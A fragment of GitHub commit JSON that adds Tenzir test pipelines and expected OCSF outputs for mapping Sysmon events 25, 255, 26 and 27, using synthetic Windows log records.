      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F25-ProcessTampering.tql?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/25-ProcessTampering.xml\" {\n+  read_all\n+}\n+sysmon::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure deterministic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "d00e85f679d9ac5dd20f36f673e67c59655cdadd",
      "filename": "sysmon/tests/ocsf/25-ProcessTampering.txt",
      "status": "added",
      "additions": 87,
      "deletions": 0,
      "changes": 87,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F25-ProcessTampering.txt",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F25-ProcessTampering.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F25-ProcessTampering.txt?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,87 @@\n+{\n+  activity_id: 4,\n+  activity_name: \"Inject\",\n+  actor: {\n+    process: {\n+      file: {\n+        name: \"svchost.exe\",\n+        path: \"C:\\\\Windows\\\\System32\\\\svchost.exe\",\n+        type: \"Executable File\",\n+        type_id: 8,\n+      },\n+      name: \"svchost.exe\",\n+      path: \"C:\\\\Windows\\\\System32\\\\svchost.exe\",\n+      pid: 7744,\n+      uid: \"{A23EAE89-BD56-67E0-0000-0010E9D95E06}\",\n+    },\n+    user: {\n+      domain: \"CORP\",\n+      name: \"jdoe\",\n+    },\n+  },\n+  category_name: \"System Activity\",\n+  category_uid: 1,\n+  class_name: \"Process Activity\",\n+  class_uid: 1007,\n+  device: {\n+    hostname: \"WORKSTATION01.corp.local\",\n+  },\n+  injection_type: \"Other\",\n+  injection_type_id: 99,\n+  metadata: {\n+    event_code: \"25\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"4\",\n+    log_name: \"Microsoft-Windows-Sysmon/Operational\",\n+    log_version: \"5\",\n+    logged_time: 2025-03-22T10:31:00Z,\n+    original_event_uid: \"1025\",\n+    product: {\n+      name: \"Microsoft-Windows-Sysmon\",\n+      uid: \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  process: {\n+    file: {\n+      name: \"svchost.exe\",\n+      path: \"C:\\\\Windows\\\\System32\\\\svchost.exe\",\n+      type: \"Executable File\",\n+      type_id: 8,\n+    },\n+    name: \"svchost.exe\",\n+    path: \"C:\\\\Windows\\\\System32\\\\svchost.exe\",\n+    pid: 7744,\n+    uid: \"{A23EAE89-BD56-67E0-0000-0010E9D95E06}\",\n+    user: {\n+      domain: \"CORP\",\n+      name: \"jdoe\",\n+    },\n+  },\n+  raw_data: \"<!-- Sysmon EID 25 \u2013 ProcessTampering (Schema 4.90) -->\\n<!-- Detects process-hiding techniques such as process hollowing (\\\"hollow\\\") and -->\\n<!-- process herpaderping (\\\"herpaderp\\\"), where a process image is replaced after mapping. -->\\n<!-- Type field values: \\\"Image is replaced\\\", \\\"Image is locked for access\\\" -->\\n<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-Sysmon\\\" Guid=\\\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\\\"/>\\n    <EventID>25</EventID>\\n    <Version>5</Version>\\n    <Level>4</Level>\\n    <Task>25</Task>\\n    <Opcode>0</Opcode>\\n    <Keywords>0x8000000000000000</Keywords>\\n    <TimeCreated SystemTime=\\\"2025-03-22T10:31:00.000000000Z\\\"/>\\n    <EventRecordID>1025</EventRecordID>\\n    <Correlation/>\\n    <Execution ProcessID=\\\"3216\\\" ThreadID=\\\"3964\\\"/>\\n    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\\n    <Computer>WORKSTATION01.corp.local</Computer>\\n    <Security UserID=\\\"S-1-5-18\\\"/>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"RuleName\\\">-</Data>\\n    <Data Name=\\\"UtcTime\\\">2025-03-22 10:31:00.000</Data>\\n    <Data Name=\\\"ProcessGuid\\\">{A23EAE89-BD56-67E0-0000-0010E9D95E06}</Data>\\n    <Data Name=\\\"ProcessId\\\">7744</Data>\\n    <Data Name=\\\"Image\\\">C:\\\\Windows\\\\System32\\\\svchost.exe</Data>\\n    <Data Name=\\\"Type\\\">Image is replaced</Data>\\n    <Data Name=\\\"User\\\">CORP\\\\jdoe</Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 1367,\n+  severity: \"Informational\",\n+  severity_id: 1,\n+  time: 2025-03-22T10:31:00Z,\n+  type_name: \"Process Activity: Inject\",\n+  type_uid: 100704,\n+  unmapped: {\n+    System: {\n+      Task: 25,\n+      Opcode: 0,\n+      Keywords: \"0x8000000000000000\",\n+    },\n+    EventData: {\n+      TamperingType: \"Image is replaced\",\n+    },\n+  },\n+}"
    },
    {
      "sha": "cac79333b9fd256c653cce3829edc87e52cee06e",
      "filename": "sysmon/tests/ocsf/255-Error.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F255-Error.tql",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F255-Error.tql",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F255-Error.tql?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/255-Error.xml\" {\n+  read_all\n+}\n+sysmon::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure deterministic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "e4e35097328551e16b73f04948d309b064088cac",
      "filename": "sysmon/tests/ocsf/255-Error.txt",
      "status": "added",
      "additions": 53,
      "deletions": 0,
      "changes": 53,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F255-Error.txt",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F255-Error.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F255-Error.txt?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,53 @@\n+{\n+  activity_id: 0,\n+  activity_name: \"Unknown\",\n+  category_name: \"Uncategorized\",\n+  category_uid: 0,\n+  class_name: \"Base Event\",\n+  class_uid: 0,\n+  device: {\n+    hostname: \"WORKSTATION01.corp.local\",\n+  },\n+  message: \"Failed to access process: Access is denied. (PID: 4, Image: System)\",\n+  metadata: {\n+    event_code: \"255\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"2\",\n+    log_name: \"Microsoft-Windows-Sysmon/Operational\",\n+    log_version: \"3\",\n+    logged_time: 2025-03-22T10:36:00Z,\n+    original_event_uid: \"1255\",\n+    product: {\n+      name: \"Microsoft-Windows-Sysmon\",\n+      uid: \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  raw_data: \"<!-- Sysmon EID 255 \u2013 Error (Schema 4.90) -->\\n<!-- Generated when Sysmon encounters an internal error. -->\\n<!-- ID field contains the internal error code; Description explains the issue. -->\\n<!-- Check for these if events seem to be missing \u2014 could indicate a config or resource issue. -->\\n<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-Sysmon\\\" Guid=\\\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\\\"/>\\n    <EventID>255</EventID>\\n    <Version>3</Version>\\n    <Level>2</Level>\\n    <Task>255</Task>\\n    <Opcode>0</Opcode>\\n    <Keywords>0x8000000000000000</Keywords>\\n    <TimeCreated SystemTime=\\\"2025-03-22T10:36:00.000000000Z\\\"/>\\n    <EventRecordID>1255</EventRecordID>\\n    <Correlation/>\\n    <Execution ProcessID=\\\"3216\\\" ThreadID=\\\"3964\\\"/>\\n    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\\n    <Computer>WORKSTATION01.corp.local</Computer>\\n    <Security UserID=\\\"S-1-5-18\\\"/>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"UtcTime\\\">2025-03-22 10:36:00.000</Data>\\n    <Data Name=\\\"ID\\\">3</Data>\\n    <Data Name=\\\"Description\\\">Failed to access process: Access is denied. (PID: 4, Image: System)</Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 1185,\n+  severity: \"High\",\n+  severity_id: 4,\n+  status: \"Failure\",\n+  status_code: \"3\",\n+  status_id: 2,\n+  time: 2025-03-22T10:36:00Z,\n+  type_name: \"Base Event: Unknown\",\n+  type_uid: 0,\n+  unmapped: {\n+    System: {\n+      Task: 255,\n+      Opcode: 0,\n+      Keywords: \"0x8000000000000000\",\n+    },\n+    EventData: {},\n+  },\n+}"
    },
    {
      "sha": "37a77c9d206276ec97475f951f26793c1cb9fa45",
      "filename": "sysmon/tests/ocsf/26-FileDeleteDetected.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F26-FileDeleteDetected.tql",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F26-FileDeleteDetected.tql",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F26-FileDeleteDetected.tql?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/26-FileDeleteDetected.xml\" {\n+  read_all\n+}\n+sysmon::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure deterministic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "8ff4ec97ce0e7e4a771c2d9b7beb658b4d040fa5",
      "filename": "sysmon/tests/ocsf/26-FileDeleteDetected.txt",
      "status": "added",
      "additions": 96,
      "deletions": 0,
      "changes": 96,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F26-FileDeleteDetected.txt",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F26-FileDeleteDetected.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F26-FileDeleteDetected.txt?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,96 @@\n+{\n+  activity_id: 4,\n+  activity_name: \"Delete\",\n+  actor: {\n+    process: {\n+      file: {\n+        name: \"payload.exe\",\n+        path: \"C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\payload.exe\",\n+        type: \"Executable File\",\n+        type_id: 8,\n+      },\n+      name: \"payload.exe\",\n+      path: \"C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\payload.exe\",\n+      pid: 4812,\n+      uid: \"{A23EAE89-BD56-67E0-0000-0010E9D95E03}\",\n+    },\n+    user: {\n+      domain: \"CORP\",\n+      name: \"jdoe\",\n+    },\n+  },\n+  category_name: \"System Activity\",\n+  category_uid: 1,\n+  class_name: \"File System Activity\",\n+  class_uid: 1001,\n+  device: {\n+    hostname: \"WORKSTATION01.corp.local\",\n+  },\n+  file: {\n+    hashes: [\n+      {\n+        algorithm: \"SHA-1\",\n+        algorithm_id: 2,\n+        value: \"BBCC2233...\",\n+      },\n+      {\n+        algorithm: \"MD5\",\n+        algorithm_id: 1,\n+        value: \"DDEE4455...\",\n+      },\n+      {\n+        algorithm: \"SHA-256\",\n+        algorithm_id: 3,\n+        value: \"FF006677...\",\n+      },\n+      {\n+        algorithm: \"Other\",\n+        algorithm_id: 99,\n+        value: \"88991122...\",\n+      },\n+    ],\n+    is_deleted: true,\n+    name: \"stage2_loader.dll\",\n+    path: \"C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\stage2_loader.dll\",\n+    type: \"Executable File\",\n+    type_id: 8,\n+  },\n+  metadata: {\n+    event_code: \"26\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"4\",\n+    log_name: \"Microsoft-Windows-Sysmon/Operational\",\n+    log_version: \"5\",\n+    logged_time: 2025-03-22T10:32:00Z,\n+    original_event_uid: \"1026\",\n+    product: {\n+      name: \"Microsoft-Windows-Sysmon\",\n+      uid: \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  raw_data: \"<!-- Sysmon EID 26 \u2013 FileDeleteDetected (Schema 4.90) -->\\n<!-- Like EID 23 but does NOT archive the deleted file. Detection-only. -->\\n<!-- Lower storage overhead than EID 23 when archiving isn't needed. -->\\n<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-Sysmon\\\" Guid=\\\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\\\"/>\\n    <EventID>26</EventID>\\n    <Version>5</Version>\\n    <Level>4</Level>\\n    <Task>26</Task>\\n    <Opcode>0</Opcode>\\n    <Keywords>0x8000000000000000</Keywords>\\n    <TimeCreated SystemTime=\\\"2025-03-22T10:32:00.000000000Z\\\"/>\\n    <EventRecordID>1026</EventRecordID>\\n    <Correlation/>\\n    <Execution ProcessID=\\\"3216\\\" ThreadID=\\\"3964\\\"/>\\n    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\\n    <Computer>WORKSTATION01.corp.local</Computer>\\n    <Security UserID=\\\"S-1-5-18\\\"/>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"RuleName\\\">-</Data>\\n    <Data Name=\\\"UtcTime\\\">2025-03-22 10:32:00.000</Data>\\n    <Data Name=\\\"ProcessGuid\\\">{A23EAE89-BD56-67E0-0000-0010E9D95E03}</Data>\\n    <Data Name=\\\"ProcessId\\\">4812</Data>\\n    <Data Name=\\\"User\\\">CORP\\\\jdoe</Data>\\n    <Data Name=\\\"Image\\\">C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\payload.exe</Data>\\n    <Data Name=\\\"TargetFilename\\\">C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\stage2_loader.dll</Data>\\n    <Data Name=\\\"Hashes\\\">SHA1=BBCC2233...,MD5=DDEE4455...,SHA256=FF006677...,IMPHASH=88991122...</Data>\\n    <Data Name=\\\"IsExecutable\\\">true</Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 1463,\n+  severity: \"Informational\",\n+  severity_id: 1,\n+  time: 2025-03-22T10:32:00Z,\n+  type_name: \"File System Activity: Delete\",\n+  type_uid: 100104,\n+  unmapped: {\n+    System: {\n+      Task: 26,\n+      Opcode: 0,\n+      Keywords: \"0x8000000000000000\",\n+    },\n+    EventData: {},\n+  },\n+}"
    },
    {
      "sha": "49a57d9295a9636ebda3c2c507f63c1ce0a75d0a",
      "filename": "sysmon/tests/ocsf/27-FileBlockExecutable.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F27-FileBlockExecutable.tql",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F27-FileBlockExecutable.tql",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F27-FileBlockExecutable.tql?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/27-FileBlockExecutable.xml\" {\n+  read_all\n+}\n+sysmon::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure deterministic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "628ae7cf6c5f77339a80a6db0c6ea45ecca7826f",
      "filename": "sysmon/tests/ocsf/27-FileBlockExecutable.txt",
      "status": "added",
      "additions": 97,
      "deletions": 0,
      "changes": 97,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F27-FileBlockExecutable.txt",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F27-FileBlockExecutable.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F27-FileBlockExecutable.txt?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,97 @@\n+{\n+  activity_id: 1,\n+  activity_name: \"Create\",\n+  actor: {\n+    process: {\n+      file: {\n+        name: \"firefox.exe\",\n+        path: \"C:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe\",\n+        type: \"Executable File\",\n+        type_id: 8,\n+      },\n+      name: \"firefox.exe\",\n+      path: \"C:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe\",\n+      pid: 5500,\n+      uid: \"{A23EAE89-BD56-67E0-0000-0010E9D95E07}\",\n+    },\n+    user: {\n+      domain: \"CORP\",\n+      name: \"jdoe\",\n+    },\n+  },\n+  category_name: \"System Activity\",\n+  category_uid: 1,\n+  class_name: \"File System Activity\",\n+  class_uid: 1001,\n+  device: {\n+    hostname: \"WORKSTATION01.corp.local\",\n+  },\n+  file: {\n+    hashes: [\n+      {\n+        algorithm: \"SHA-1\",\n+        algorithm_id: 2,\n+        value: \"CC001122...\",\n+      },\n+      {\n+        algorithm: \"MD5\",\n+        algorithm_id: 1,\n+        value: \"DD334455...\",\n+      },\n+      {\n+        algorithm: \"SHA-256\",\n+        algorithm_id: 3,\n+        value: \"EE667788...\",\n+      },\n+      {\n+        algorithm: \"Other\",\n+        algorithm_id: 99,\n+        value: \"FF990011...\",\n+      },\n+    ],\n+    name: \"update.exe\",\n+    path: \"C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\update.exe\",\n+    type: \"Executable File\",\n+    type_id: 8,\n+  },\n+  metadata: {\n+    event_code: \"27\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"4\",\n+    log_name: \"Microsoft-Windows-Sysmon/Operational\",\n+    log_version: \"5\",\n+    logged_time: 2025-03-22T10:33:00Z,\n+    original_event_uid: \"1027\",\n+    product: {\n+      name: \"Microsoft-Windows-Sysmon\",\n+      uid: \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  raw_data: \"<!-- Sysmon EID 27 \u2013 FileBlockExecutable (Schema 4.90) -->\\n<!-- Fires AND blocks creation of an executable file (PE format) matching a rule. -->\\n<!-- This is an active blocking event, not just telemetry \u2014 Sysmon prevents the write. -->\\n<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-Sysmon\\\" Guid=\\\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\\\"/>\\n    <EventID>27</EventID>\\n    <Version>5</Version>\\n    <Level>4</Level>\\n    <Task>27</Task>\\n    <Opcode>0</Opcode>\\n    <Keywords>0x8000000000000000</Keywords>\\n    <TimeCreated SystemTime=\\\"2025-03-22T10:33:00.000000000Z\\\"/>\\n    <EventRecordID>1027</EventRecordID>\\n    <Correlation/>\\n    <Execution ProcessID=\\\"3216\\\" ThreadID=\\\"3964\\\"/>\\n    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\\n    <Computer>WORKSTATION01.corp.local</Computer>\\n    <Security UserID=\\\"S-1-5-18\\\"/>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"RuleName\\\">block-exec-in-temp</Data>\\n    <Data Name=\\\"UtcTime\\\">2025-03-22 10:33:00.000</Data>\\n    <Data Name=\\\"ProcessGuid\\\">{A23EAE89-BD56-67E0-0000-0010E9D95E07}</Data>\\n    <Data Name=\\\"ProcessId\\\">5500</Data>\\n    <Data Name=\\\"User\\\">CORP\\\\jdoe</Data>\\n    <Data Name=\\\"Image\\\">C:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe</Data>\\n    <Data Name=\\\"TargetFilename\\\">C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\update.exe</Data>\\n    <Data Name=\\\"Hashes\\\">SHA1=CC001122...,MD5=DD334455...,SHA256=EE667788...,IMPHASH=FF990011...</Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 1462,\n+  severity: \"Informational\",\n+  severity_id: 1,\n+  status: \"Failure\",\n+  status_id: 2,\n+  time: 2025-03-22T10:33:00Z,\n+  type_name: \"File System Activity: Create\",\n+  type_uid: 100101,\n+  unmapped: {\n+    System: {\n+      Task: 27,\n+      Opcode: 0,\n+      Keywords: \"0x8000000000000000\",\n+    },\n+    EventData: {},\n+  },\n+}"
    },
